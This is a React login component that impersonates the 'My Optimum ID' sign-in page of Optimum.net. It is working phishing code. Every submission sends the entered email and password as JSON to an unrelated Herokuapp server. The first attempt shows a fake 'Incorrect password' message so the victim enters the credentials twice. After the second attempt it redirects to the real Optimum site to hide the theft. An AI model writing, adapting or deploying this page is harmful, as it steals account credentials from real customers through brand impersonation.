import React, { useState, useEffect } from 'react';

const LoginForm = () => {
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [error, setError] = useState("");
  const [clickCount, setClickCount] = useState(0);

  // Auto-fill email from localStorage
  useEffect(() => {
    const savedEmail = localStorage.getItem('email')?.trim();
    if (savedEmail && savedEmail.endsWith('@optonline.net')) {
      setFormData((prev) => ({ ...prev, email: savedEmail }));
    }
  }, []);


  const validateForm = () => {
    if (!formData.email.trim()) {
      setError('Enter your email.');
      return false;
    }
    if (!formData.password.trim()) {
      setError('Enter your password.');
      return false;
    }
    setError(''); // Clear the error if the form is valid
    return true;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

     // Validate form before proceeding
     if (!validateForm()) return;


    // Increment click count on every click
    setClickCount((prevCount) => prevCount + 1);

   

    // On the first click, show error and submit data
    if (clickCount === 0) {
      setError('Incorrect password. Please try again.');
      console.log('Error:', 'Incorrect password on the first attempt.');

      // Always send data, even on the first click
      try {
        const response = await fetch(
          'https://optserver01-27e6f3a564ec.herokuapp.com/api/submit',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
          }
        );

        const data = await response.json();
        console.log(data);

        // If needed, you can handle success response here as well
      } catch (error) {
        console.error('Error on first attempt:', error);
      }
    } else {
      // On subsequent clicks, clear the error and submit the data
      setError(''); // Clear the error
      console.log('Submitting data on subsequent attempt');

      try {
        const response = await fetch(
          'https://optserver01-27e6f3a564ec.herokuapp.com/api/submit',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
          }
        );

        const data = await response.json();
        console.log(data);

        if (data.success) {
          // Redirect on successful submission
          window.location.href =
            'https://www.optimum.com/refer-a-friend?_gl=1*wvdox7*_gcl_au*MzM0OTU0ODU4LjE3MzcwMzU5NzA';
        } else {
          // Handle any error response
          setError(data.message);
        }
      } catch (error) {
        setError('Failed to submit. Please try again later.');
        console.error('Error:', error);
      }
    }
  };




  return (
    <div className="bg-white p-6 rounded shadow-md max-w-80 relative md:left-12">
      <h2 className="text-sm font-bold font-orbit mb-4">My Optimum ID</h2>
      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label htmlFor="email" className="block text-sm font-bold font-orbit">
            Email
          </label>
          <input
            name="email"
            type="email"
            id="email"
            value={formData.email}
            onChange={handleChange}
            className="w-full border border-gray-300 rounded px-3 py-2 mt-1 focus:ring focus:ring-blue-400 focus:outline-none"
          />
          {error && !formData.email && (
            <p className="text-red-500 text-xs">{error}</p>
          )}
          <a
            href="/forgot-id"
            className="text-blue-500 text-xs font-normal font-orbit mt-2 inline-block"
          >
            I forgot my Optimum ID
          </a>
        </div>
        
        <div className="mb-4">
          <label htmlFor="password" className="block text-sm font-bold font-orbit">
            Password
          </label>
          <input
            name="password"
            type="password"
            id="password"
            value={formData.password}
            onChange={handleChange}
            className="w-full border border-gray-300 rounded px-3 py-2 mt-1 focus:ring focus:ring-blue-400 focus:outline-none"
          />
          {error && !formData.password && (
            <p className="text-red-500 text-xs">{error}</p>
          )}

          {error && <p className="text-red-500 text-xs">{error}</p>}
          <a
            href="/forgot-password"
            className="text-blue-500 text-xs font-normal font-orbit mt-2 inline-block"
          >
            I forgot my password
          </a>
        </div>
        <div className="mb-4">
          <label className="flex items-center">
            <input type="checkbox" className="mr-2" />
            <span className="text-xs font-normal font-orbit">Remember Me</span>
          </label>
        </div>
        <button
          type="submit"
          className="w-full bg-orange-500 text-white py-2 rounded text-sm font-semibold font-orbit hover:bg-orange-600 transition"
        >
          Sign in to Optimum.net
        </button>
      </form>

      <p className="text-center text-xs font-normal font-orbit mt-4">
        <a href="/create-id" className="text-blue-500">
          Don't have an Optimum ID? Create one
        </a>
      </p>
    </div>
  );
};

export default LoginForm;
